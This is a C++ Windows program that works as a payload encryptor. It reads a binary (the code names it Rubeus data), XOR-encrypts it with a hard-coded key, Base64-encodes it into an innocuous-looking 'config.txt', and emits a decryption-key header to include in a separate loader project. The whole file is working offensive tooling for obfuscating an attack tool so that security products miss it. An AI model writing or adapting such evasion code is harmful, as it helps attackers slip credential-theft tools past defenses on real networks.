#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <iomanip>
#include <sstream>
#include <Windows.h>
#include <wincrypt.h>


#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")

using namespace std;

// The key!
const unsigned char XOR_KEY[] = {
    0x4D, 0x61, 0x6E, 0x75, 0x73, 0x5F, 0x4B, 0x65,
    0x79, 0x5F, 0x32, 0x30, 0x32, 0x35, 0x21, 0x40
};
const size_t KEY_LENGTH = sizeof(XOR_KEY);


vector<unsigned char> XorEncrypt(const vector<unsigned char>& data) {
    vector<unsigned char> encrypted(data.size());

    for (size_t i = 0; i < data.size(); i++) {
        encrypted[i] = data[i] ^ XOR_KEY[i % KEY_LENGTH];
    }

    return encrypted;
}


string Base64Encode(const vector<unsigned char>& data) {
    DWORD base64Length = 0;


    DWORD dataSize = static_cast<DWORD>(data.size());

    CryptBinaryToStringA(
        data.data(),
        dataSize,
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
        NULL,
        &base64Length
    );


    vector<char> base64(base64Length);


    if (!CryptBinaryToStringA(
        data.data(),
        dataSize,
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
        base64.data(),
        &base64Length
    )) {
        cerr << "[-] Failed to encode to Base64. Error: " << GetLastError() << endl;
        return "";
    }

    return string(base64.begin(), base64.end() - 1);
}


vector<unsigned char> ReadBinaryFile(const string& filename) {
    ifstream file(filename, ios::binary | ios::ate);

    if (!file.is_open()) {
        cerr << "[-] Failed to open file: " << filename << endl;
        return vector<unsigned char>();
    }

    streamsize size = file.tellg();
    file.seekg(0, ios::beg);

    vector<unsigned char> buffer(size);
    if (!file.read(reinterpret_cast<char*>(buffer.data()), size)) {
        cerr << "[-] Failed to read file: " << filename << endl;
        return vector<unsigned char>();
    }

    file.close();
    return buffer;
}


bool WriteTextFile(const string& filename, const string& content) {
    ofstream file(filename);

    if (!file.is_open()) {
        cerr << "[-] Failed to create file: " << filename << endl;
        return false;
    }

    file << content;
    file.close();

    return true;
}

bool GenerateKeyHeader(const string& filename) {
    ofstream file(filename);

    if (!file.is_open()) {
        cerr << "[-] Failed to create header file: " << filename << endl;
        return false;
    }

    file << "#pragma once\n\n";
    file << "// XOR Decryption Key\n";
    file << "// Generated automatically by Encryptor\n\n";
    file << "const unsigned char XOR_KEY[] = {\n    ";

    for (size_t i = 0; i < KEY_LENGTH; i++) {
        file << "0x" << hex << uppercase << setw(2) << setfill('0')
            << (int)XOR_KEY[i];

        if (i < KEY_LENGTH - 1) {
            file << ", ";
            if ((i + 1) % 8 == 0) {
                file << "\n    ";
            }
        }
    }

    file << "\n};\n\n";
    file << "const size_t KEY_LENGTH = sizeof(XOR_KEY);\n";

    file.close();
    return true;
}

int main(int argc, char* argv[]) {

    string inputFile;
    string outputFile = "config.txt";
    string keyHeaderFile = "DecryptionKey.h";

    if (argc >= 2) {
        inputFile = argv[1];
    }
    if (argc >= 3) {
        outputFile = argv[2];
    }

    cout << "[+] Input file:  " << inputFile << endl;
    cout << "[+] Output file: " << outputFile << endl;
    cout << "[+] Key header:  " << keyHeaderFile << endl;
    cout << endl;

    cout << "[*] Reading binary file..." << endl;
    vector<unsigned char> rubeusData = ReadBinaryFile(inputFile);

    if (rubeusData.empty()) {
        cerr << "[-] Failed to read input file!" << endl;
        return 1;
    }

    cout << "[+] File size: " << rubeusData.size() << " bytes" << endl;


    cout << "[*] Encrypting with XOR..." << endl;
    vector<unsigned char> encryptedData = XorEncrypt(rubeusData);
    cout << "[+] Encryption completed!" << endl;


    cout << "[*] Encoding to Base64..." << endl;
    string base64Data = Base64Encode(encryptedData);

    if (base64Data.empty()) {
        cerr << "[-] Failed to encode to Base64!" << endl;
        return 1;
    }

    cout << "[+] Base64 length: " << base64Data.length() << " characters" << endl;


    cout << "[*] Writing to output file..." << endl;
    if (!WriteTextFile(outputFile, base64Data)) {
        cerr << "[-] Failed to write output file!" << endl;
        return 1;
    }

    cout << "[+] Output file created successfully!" << endl;


    cout << "[*] Generating key header file..." << endl;
    if (!GenerateKeyHeader(keyHeaderFile)) {
        cerr << "[-] Failed to generate key header!" << endl;
        return 1;
    }

    cout << "[+] Key header created successfully!" << endl;


    cout << "[+] Files created:" << endl;
    cout << "    - " << outputFile << " (encrypted payload)" << endl;
    cout << "    - " << keyHeaderFile << " (decryption key)" << endl;
    cout << endl;
    cout << "[!] Include '" << keyHeaderFile << "' in your loader project!" << endl;
    cout << "[!] Keep the XOR_KEY secret and change it for production!" << endl;

    return 0;
}